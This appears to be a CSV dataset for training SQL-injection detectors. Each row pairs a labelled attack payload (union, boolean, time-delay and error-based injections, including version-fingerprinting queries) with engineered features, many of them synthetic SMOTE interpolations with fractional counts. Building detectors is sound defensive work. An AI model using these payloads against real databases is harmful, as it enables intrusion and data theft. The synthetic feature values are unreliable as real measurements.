id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000031,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'jhle' like 'jhle",nearest_attack_euclidean,R002061,0.18902864251487483,228.44510501417403,34.717291820758916,3.5810249718220866,66.43458364151785,24.0,101.15187546227676,36.85864591037946,0.2907907921699313,0.10508869326304987,0.4427542315838376,0.16136628298318115,4.0,0.0,0.0,0.0,0.0,1.14135408962054,0.0,21.71729182075892,0.0,1.0,3.0,7.14135408962054,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000032,attack,union,"-2630'   )    )    as xavw where 6291  =  6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",nearest_attack_euclidean,R005793,0.3515657808755964,108.46192000499846,29.67423058852932,3.9686393452591933,25.0,49.393844708234575,20.045383531175926,14.022691765587963,0.23181877372716933,0.4553154690250335,0.18384983563430002,0.1290159216134971,1.0,0.0,1.0,0.0,0.0,1.0,0.0,1.674230588529321,0.0,0.0,8.348461177058642,2.0,1.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000033,attack,boolean,"1'   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'swfj' like 'swfj",nearest_attack_euclidean,R004562,0.03631386849597367,174.32224620306573,31.019933935203948,3.83030023635043,78.0,10.0,61.44184981428943,24.880396388776308,0.44785672932769494,0.05741752940098652,0.35203017033072237,0.14269557094059615,4.0,0.0,0.0,0.0,1.0,1.0,0.0,9.880396388776306,0.0,5.0,4.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000034,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R002505,0.2691996126482205,91.06271664952537,28.415453920560317,3.900805994416053,40.0,8.0,30.81635488784442,12.246361761680948,0.4428914820861604,0.0885782964172321,0.3343948484607257,0.13413537303588172,3.0,0.0,0.0,0.0,1.0,1.0,0.0,5.246361761680947,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,other,1' where 6116  =  6116,nearest_attack_euclidean,R001565,0.06328560358099386,21.999999999999986,9.152370542879513,2.7998891955806746,5.0,9.0,6.0,2.0,0.22727272727272727,0.4090909090909091,0.2727272727272727,0.09090909090909091,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000036,attack,other,1 where 3354  =  3354,nearest_attack_euclidean,R001055,1.6858739404357614e-07,20.999999999999986,10.0,2.9870900416203345,5.0,9.0,6.0,0.9999999999999982,0.23809523809523808,0.42857142857142855,0.2857142857142857,0.047619047619047616,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999996,0.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000037,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R004256,0.30646863588028067,74.1633806356744,22.416338063567437,3.4550569230518966,27.0,4.0,30.33070450853951,12.832676127134878,0.3656408433637128,0.054169013831661145,0.4072746497204567,0.17291549308416942,6.0,0.0,0.0,0.0,0.0,0.0,0.0,4.832676127134878,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000038,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R008434,0.08274472480718864,86.16154433812406,27.332545282788317,3.7167244952217136,24.997635848364954,18.0,33.99763584836495,9.166272641394158,0.28963234501076074,0.20951057951813534,0.3943876347698284,0.1064694407012755,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.166272641394158,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,union,"1'  )   as xhmm where 8092  =  8092 union all select null,null,null--",nearest_attack_euclidean,R006388,0.1815565312941461,70.67508543656656,26.0,4.034513061554604,37.0,9.0,17.435787517057047,7.239297919509509,0.5244130127473374,0.12755992201962263,0.24566513571545984,0.10236192951758012,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.2392979195095082,0.0,0.0,2.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,other,-3084%'   )    )    order by 1--,nearest_attack_euclidean,R001986,0.4389457878559371,29.890823770414386,15.698689110059199,3.308827626368986,7.0,5.0,11.192134660355194,6.698689110059199,0.23720529200887402,0.16943235143491003,0.36820950014497394,0.225152856411242,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.6986891100591999,0.9999999999999999,0.0,0.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,2.0
SMOTE_000041,attack,other,1'||  (  select 'mwpd' where 2887  =  2887,nearest_attack_euclidean,R005660,0.025247841779824122,42.0,20.0,3.813216826066975,15.0,9.0,11.0,7.0,0.35714285714285715,0.21428571428571427,0.2619047619047619,0.16666666666666666,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000042,attack,other,"-6595"" order by 1--",nearest_attack_euclidean,R004493,0.36986926100888057,18.85309643452426,12.853096434524259,3.5196248528794594,7.0,5.0,3.0,3.8530964345242573,0.37142785075535145,0.26530560768239386,0.15918336460943633,0.20408317695281833,0.0,0.853096434524258,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.853096434524258,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.9999999999999999,0.0,0.0,0.0,2.0
SMOTE_000043,attack,error,"1  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R002522,0.5951160618325714,332.28238842888265,32.282388428882705,3.4412739446355807,81.0,49.0,146.0,56.2823884288827,0.24376900880332592,0.14746520285633297,0.43938611463315536,0.1693796737071857,0.2823884288827031,0.0,0.0,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.0,0.28238842888270316,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000044,attack,union,"-7320""  )   where 3907  =  3907 union all select 3907,3907--",nearest_attack_euclidean,R003264,0.14366419956322538,61.12594978049009,24.225189956098017,3.9779122412608685,19.0,20.900759824392072,14.0,7.225189956098019,0.3111812703001765,0.3414170753471083,0.22929146232644584,0.11811019202626935,0.0,1.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.225189956098018,4.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000045,attack,union,"-3116   )    )    as jyiq where 3875  =  3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",nearest_attack_euclidean,R007921,0.5043804140164158,104.19632550347322,27.601224832175596,3.947551620646815,25.0,47.190201342595245,19.607348993053574,12.398775167824406,0.23997910445257095,0.45245946291761197,0.1886094326074471,0.11895200002236996,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.6012248321755953,0.0,0.0,7.797550335648809,2.0,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,union,"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",nearest_attack_euclidean,R006212,0.14141813666378464,102.88705625185189,28.0,4.060614350398342,29.0,43.10964500148151,15.0,15.777411250370378,0.28198090216552985,0.4188396081072838,0.14585219077527406,0.1533272989519123,3.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,6.777411250370378,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,time,"1""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005928,0.8451348447561357,81.44860522363861,27.44860522363861,3.555986787345974,16.0,21.0,34.0,10.448605223638609,0.19645021325230083,0.25784090489364486,0.4174567031611393,0.12825217869291497,0.0,1.0,0.0,0.0,0.0,1.0,0.0,6.0,0.44860522363860783,0.0,1.0,0.9999999999999996,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000048,attack,time,"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R005464,0.6380815233222521,108.6987035033551,29.69870350335511,3.793645121913209,27.0,29.0,42.0,10.698703503355109,0.24839746902900203,0.26679728154966886,0.3863960629340032,0.09840918648732591,0.6987035033551088,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,0.6987035033551089,0.0,0.0,1.0000000000000002,2.168404344971009e-19,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R004978,0.15292402384025292,67.63088482795564,15.0,3.0052347049287604,51.30470786236451,1.0,4.0,11.326176965591127,0.7585502512843099,0.014803481684175057,0.059213926736700284,0.16743234029481485,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.326176965591126,2.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000050,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,0.008143634285864143,42.0,21.0,3.8622844404770778,15.0,9.0,11.0,7.0,0.35714285714285715,0.21428571428571427,0.2619047619047619,0.16666666666666666,3.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9999999999999999,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000051,attack,union," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000248,0.02616007478261204,89.89228580831546,33.89228580831547,4.131235250368857,42.0,4.0,29.0,14.89228580831547,0.4672314601811174,0.04449823430296357,0.32261219869648583,0.16565810681943324,3.0,0.0,2.0,0.0,1.0,2.0,0.0,1.9999999999999991,0.0,0.0,1.0,5.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000052,attack,time,select pg_sleep  (  5  )   and 'qfaz' like 'qfaz,nearest_attack_euclidean,R008084,2.0156938893765357,51.219303019035635,20.08019913741839,3.807654335380477,28.459900431290805,0.540099568709195,12.999999999999996,9.219303019035635,0.5575510364276367,0.01125207434810821,0.25498070483050633,0.17621618439374875,3.91980086258161,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.540099568709195,0.45990043129080505,1.8396017251632202,1.0,0.0,0.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.459900431290805,0.540099568709195,0.0,0.0,0.0,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0801991374183904
SMOTE_000053,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R004771,0.0025788626688949797,66.02483521910519,23.004967043821036,3.8440041205314137,35.01986817528415,9.0,14.0,8.004967043821038,0.530397368096473,0.13631593747931142,0.21204701385670668,0.12123968056750896,0.0,1.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,3.004967043821037,3.0,0.0,1.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,time,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""fkmh""  =  ""fkmh",nearest_attack_euclidean,R008979,0.04031256841132658,111.9415812870202,26.019472904326598,3.283121653648048,40.941581287020206,2.0,53.0,16.0,0.36573167360570397,0.017866713419557617,0.4734679056182773,0.14293370735646105,0.0,4.0,0.0,0.0,1.0,1.0,0.0,10.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,0.0,0.0,1.0,1.0,0.019472904326598817,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.019472904326599
SMOTE_000055,attack,union,"-8358'   )    )     )   union all select 7282,7282--",nearest_attack_euclidean,R007235,0.0009933932245219264,52.0,20.0,3.5600624547412134,14.0,12.0,18.0,8.0,0.2692307692307692,0.23076923076923078,0.34615384615384615,0.15384615384615385,1.0,0.0,3.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,union,"-7083 union all select 7705,7705,7705,7705,7705#",nearest_attack_euclidean,R006666,0.18458311727982038,49.19122770371696,19.238245540743392,3.7641173578875637,14.0,24.95298216297357,4.0,6.238245540743392,0.2851111682971551,0.5067427983229262,0.08146033379918716,0.12668569958073156,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.238245540743391,0.9999999999999996,0.0,0.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000057,attack,boolean,-2983'  )   or 8571  =  8571--,nearest_attack_euclidean,R006161,1.4600096599955427e-07,30.0,14.0,3.2825887305018333,2.0,12.0,10.0,6.0,0.06666666666666665,0.4,0.3333333333333333,0.2,1.0,0.0,3.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.0,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000058,attack,union," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000387,1.2555602535659431,100.85427919743205,26.0,4.0521730767175494,64.20244525567546,3.449388686081136,24.10122262783773,9.101222627837728,0.6366645400039386,0.03441451088026784,0.23891456912760928,0.09000637998818431,1.6518339417565922,0.0,2.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,5.0,0.5506113139188641,0.0,1.0,0.0,2.168404344971009e-19,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,2.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000059,attack,boolean,-4289' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'agnc' like 'agnc,nearest_attack_euclidean,R004905,0.9848198839643936,351.41363679965104,30.85578516360464,3.2686933360593957,86.2789258180232,50.0,165.04173570895344,50.092975272674394,0.24507382235145372,0.1425858882508669,0.46981236962682493,0.14252791977085444,2.855785163604641,0.0,1.0,0.0,0.0,1.0,0.0,35.23719010906976,0.0,0.0,0.0,12.0,1.0,0.0,0.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.6185950545348804,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.618595054534882
SMOTE_000060,attack,union,"1""   )    )    union all select null,null,null,null#",nearest_attack_euclidean,R005525,0.16092155650070536,50.55660763089344,16.0,3.257990910806793,28.845286104714752,1.0,14.0,6.711321526178688,0.5700722784445025,0.019821355306508415,0.27749897429111775,0.13260739195787138,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999991,0.0,0.0,2.7113215261786885,0.0,0.0,1.0,0.0,1.0000000000000002,2.168404344971009e-19,0.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,boolean,1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,nearest_attack_euclidean,R003110,0.2757685335696187,61.901360641832504,26.0,4.065022354830882,18.0,17.0,17.0,9.901360641832504,0.29079204348149523,0.2746369299547455,0.2746369299547455,0.1599340966090138,3.0,0.0,2.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,5.901360641832504,1.0,0.0,1.0,0.0,2.168404344971009e-19,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.9013606418325039,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
